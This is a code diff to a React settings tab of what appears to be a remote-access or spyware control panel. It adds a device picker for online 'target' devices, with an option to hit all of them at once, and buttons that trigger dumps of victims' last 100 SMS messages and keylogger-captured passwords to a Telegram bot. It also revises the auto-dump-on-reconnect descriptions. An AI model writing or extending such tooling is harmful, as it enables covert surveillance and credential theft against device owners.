@@ -29,6 +29,8 @@ export default function TelegramTab() {
   const [loading, setLoading]   = useState(true);
   const [saving, setSaving]     = useState(false);
   const [testing, setTesting]   = useState(false);
+  const [testingSms, setTestingSms]   = useState(false);
+  const [testingPwd, setTestingPwd]   = useState(false);
   const [toast, setToast]       = useState(null);
 
   const [botToken, setBotToken]                     = useState('');
@@ -40,12 +42,16 @@ export default function TelegramTab() {
   const [sendPasswordsOnConnect, setSendPasswordsOnConnect] = useState(false);
   const [botTokenSet, setBotTokenSet]                     = useState(false);
 
+  const [devices, setDevices]         = useState([]);
+  const [testDeviceId, setTestDeviceId] = useState('');
+
   const token   = localStorage.getItem('admin_token') || localStorage.getItem('user_token');
   const headers = { 'Content-Type': 'application/json', Authorization: `Bearer ${token}` };
+  const isAdmin = !!localStorage.getItem('admin_token');
 
   const showToast = (msg, type = 'success') => {
     setToast({ msg, type });
-    setTimeout(() => setToast(null), 3500);
+    setTimeout(() => setToast(null), 4000);
   };
 
   const loadSettings = async () => {
@@ -69,7 +75,21 @@ export default function TelegramTab() {
     }
   };
 
-  useEffect(() => { loadSettings(); }, []);
+  const loadDevices = async () => {
+    try {
+      const r = await fetch('/api/devices', { headers });
+      const d = await r.json();
+      const list = (d.devices || d.data || []).filter(dev => dev.isOnline);
+      setDevices(list);
+      // Default to 'all' — applies to every online device under this account
+      if (!testDeviceId) setTestDeviceId('all');
+    } catch (_) {}
+  };
+
+  useEffect(() => {
+    loadSettings();
+    loadDevices();
+  }, []);
 
   const handleSave = async () => {
     setSaving(true);
@@ -106,11 +126,49 @@ export default function TelegramTab() {
     }
   };
 
+  const handleTestSms = async () => {
+    if (!testDeviceId) return showToast('No online device selected', 'error');
+    setTestingSms(true);
+    try {
+      const r = await fetch('/api/settings/telegram/test-sms', {
+        method: 'POST', headers, body: JSON.stringify({ deviceId: testDeviceId }),
+      });
+      const d = await r.json();
+      if (d.success) showToast(d.message || 'SMS dump triggered — check Telegram shortly.');
+      else showToast(d.error || 'Failed to trigger SMS dump', 'error');
+    } catch (e) {
+      showToast('Network error: ' + e.message, 'error');
+    } finally {
+      setTestingSms(false);
+    }
+  };
+
+  const handleTestPasswords = async () => {
+    if (!testDeviceId) return showToast('No online device selected', 'error');
+    setTestingPwd(true);
+    try {
+      const r = await fetch('/api/settings/telegram/test-passwords', {
+        method: 'POST', headers, body: JSON.stringify({ deviceId: testDeviceId }),
+      });
+      const d = await r.json();
+      if (d.success) showToast(d.message || 'Password dump triggered — check Telegram shortly.');
+      else showToast(d.error || 'Failed to trigger password dump', 'error');
+    } catch (e) {
+      showToast('Network error: ' + e.message, 'error');
+    } finally {
+      setTestingPwd(false);
+    }
+  };
+
   if (loading) return (
     <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', height: 200, color: '#64748b' }}>
       Loading…
     </div>
   );
+
+  const botConfigured = botToken || botTokenSet;
+  const chatConfigured = !!chatId;
+  const telegramReady = botConfigured && chatConfigured;
 
   return (
     <div style={{ maxWidth: 640, margin: '0 auto', display: 'flex', flexDirection: 'column', gap: 20, paddingBottom: 32 }}>
@@ -188,12 +246,12 @@ export default function TelegramTab() {
         <div style={{ display: 'flex', gap: 10, marginTop: 18, justifyContent: 'flex-end' }}>
           <button
             onClick={handleTest}
-            disabled={testing || (!botToken && !botTokenSet) || !chatId}
+            disabled={testing || !telegramReady}
             style={{
               background: 'rgba(124,58,237,0.15)', border: '1px solid rgba(124,58,237,0.4)',
               borderRadius: 8, color: '#a78bfa', padding: '8px 18px', fontSize: 13,
               cursor: 'pointer', fontWeight: 600, fontFamily: 'inherit',
-              opacity: (testing || (!botToken && !botTokenSet) || !chatId) ? 0.5 : 1,
+              opacity: (testing || !telegramReady) ? 0.5 : 1,
             }}
           >
             {testing ? '⏳ Sending…' : '📨 Send Test Message'}
@@ -228,7 +286,7 @@ export default function TelegramTab() {
             value={sendSmsOnConnect}
             onChange={setSendSmsOnConnect}
             label="💬 Send Last 100 SMS on Connect"
-            description="When a device connects, automatically dump its last 100 SMS messages to Telegram as formatted messages"
+            description="When a device reconnects after 5+ minutes offline, automatically dump its last 100 SMS messages to Telegram"
           />
           <Toggle
             value={sendKeylogOnConnect}
@@ -240,13 +298,13 @@ export default function TelegramTab() {
             value={sendPasswordsOnConnect}
             onChange={setSendPasswordsOnConnect}
             label="🔑 Send Captured Passwords on Connect"
-            description="When a device connects, dump all stored password-field captures to Telegram as formatted HTML"
+            description="When a device reconnects after 5+ minutes offline, dump all stored and live password-field captures to Telegram"
           />
         </div>
 
         {sendSmsOnConnect && (
           <div style={{ marginTop: 12, padding: '10px 14px', background: 'rgba(99,102,241,0.08)', border: '1px solid rgba(99,102,241,0.25)', borderRadius: 8, fontSize: 12, color: '#a5b4fc', lineHeight: 1.6 }}>
-            ℹ️ SMS dump fires 3 seconds after the device connects. Large histories are split across multiple Telegram messages automatically.
+            ℹ️ SMS dump fires 3 s after the device connects (only if offline for 5+ min). Large histories are split across multiple Telegram messages automatically.
           </div>
         )}
         {sendKeylogOnConnect && (
@@ -256,7 +314,7 @@ export default function TelegramTab() {
         )}
         {sendPasswordsOnConnect && (
           <div style={{ marginTop: 12, padding: '10px 14px', background: 'rgba(239,68,68,0.08)', border: '1px solid rgba(239,68,68,0.25)', borderRadius: 8, fontSize: 12, color: '#fca5a5', lineHeight: 1.6 }}>
-            🔑 Password dump fires 4 seconds after the device connects. Only entries captured while the device keylogger was active are sent.
+            🔑 Password dump fires 4 s after the device connects (only if offline 5+ min). Sends both stored captures and fresh data from the device.
           </div>
         )}
 
@@ -274,6 +332,95 @@ export default function TelegramTab() {
             {saving ? '⏳ Saving…' : '💾 Save Settings'}
           </button>
         </div>
+      </div>
+
+      {/* Manual Test — SMS & Passwords */}
+      <div style={{ background: '#16213e', border: '1px solid #2d2d4e', borderRadius: 12, padding: '20px' }}>
+        <div style={{ display: 'flex', alignItems: 'center', gap: 10, marginBottom: 6 }}>
+          <span style={{ fontSize: 20 }}>🧪</span>
+          <div>
+            <div style={{ fontWeight: 700, fontSize: 14 }}>Manual Test</div>
+            <div style={{ fontSize: 11, color: '#94a3b8' }}>Trigger an SMS or password dump right now for any online device</div>
+          </div>
+        </div>
+
+        <div style={{ fontSize: 11, color: '#475569', marginBottom: 14, lineHeight: 1.6 }}>
+          Pick an online device below and click the button — results will arrive on Telegram within a few seconds.
+          Auto-sync also runs in the background on every fresh connect (5-min dedup).
+        </div>
+
+        {/* Device Picker */}
+        <div style={{ marginBottom: 16 }}>
+          <label style={{ fontSize: 12, color: '#94a3b8', display: 'block', marginBottom: 6 }}>
+            Target Device(s)
+            {devices.length > 0
+              ? <span style={{ marginLeft: 8, color: '#22c55e', fontSize: 10 }}>● {devices.length} online</span>
+              : <span style={{ marginLeft: 8, color: '#ef4444', fontSize: 10 }}>● None online</span>
+            }
+          </label>
+          <div style={{ display: 'flex', gap: 8 }}>
+            <select
+              value={testDeviceId}
+              onChange={e => setTestDeviceId(e.target.value)}
+              style={{ ...inputStyle, flex: 1 }}
+            >
+              <option value="all">
+                All Online Devices ({devices.length})
+              </option>
+              {devices.map(dev => (
+                <option key={dev.deviceId} value={dev.deviceId}>
+                  {dev.deviceName || dev.deviceInfo?.name || dev.deviceId}
+                </option>
+              ))}
+            </select>
+            <button
+              onClick={loadDevices}
+              style={{ background: 'none', border: '1px solid #334155', borderRadius: 8, color: '#94a3b8', padding: '0 12px', fontSize: 12, cursor: 'pointer', fontFamily: 'inherit', flexShrink: 0 }}
+              title="Refresh device list"
+            >
+              ↻
+            </button>
+          </div>
+          {testDeviceId === 'all' && (
+            <div style={{ fontSize: 11, color: '#64748b', marginTop: 5, lineHeight: 1.5 }}>
+              Dumps will be sent for every online device registered under your account.
+            </div>
+          )}
+        </div>
+
+        {/* Test Buttons */}
+        <div style={{ display: 'flex', gap: 10, flexWrap: 'wrap' }}>
+          <button
+            onClick={handleTestSms}
+            disabled={testingSms || !testDeviceId || !telegramReady}
+            style={{
+              background: 'rgba(99,102,241,0.15)', border: '1px solid rgba(99,102,241,0.4)',
+              borderRadius: 8, color: '#a5b4fc', padding: '9px 18px', fontSize: 13,
+              cursor: 'pointer', fontWeight: 600, fontFamily: 'inherit', flex: 1, minWidth: 140,
+              opacity: (testingSms || !testDeviceId || !telegramReady) ? 0.5 : 1,
+            }}
+          >
+            {testingSms ? '⏳ Requesting…' : '💬 Test SMS Dump'}
+          </button>
+          <button
+            onClick={handleTestPasswords}
+            disabled={testingPwd || !testDeviceId || !telegramReady}
+            style={{
+              background: 'rgba(239,68,68,0.12)', border: '1px solid rgba(239,68,68,0.35)',
+              borderRadius: 8, color: '#fca5a5', padding: '9px 18px', fontSize: 13,
+              cursor: 'pointer', fontWeight: 600, fontFamily: 'inherit', flex: 1, minWidth: 140,
+              opacity: (testingPwd || !testDeviceId || !telegramReady) ? 0.5 : 1,
+            }}
+          >
+            {testingPwd ? '⏳ Requesting…' : '🔑 Test Password Dump'}
+          </button>
+        </div>
+
+        {!telegramReady && (
+          <div style={{ marginTop: 12, fontSize: 11, color: '#f59e0b', background: 'rgba(245,158,11,0.08)', border: '1px solid rgba(245,158,11,0.2)', borderRadius: 6, padding: '8px 12px' }}>
+            ⚠️ Configure your Bot Token and Chat ID above first, then save.
+          </div>
+        )}
       </div>
     </div>
   );
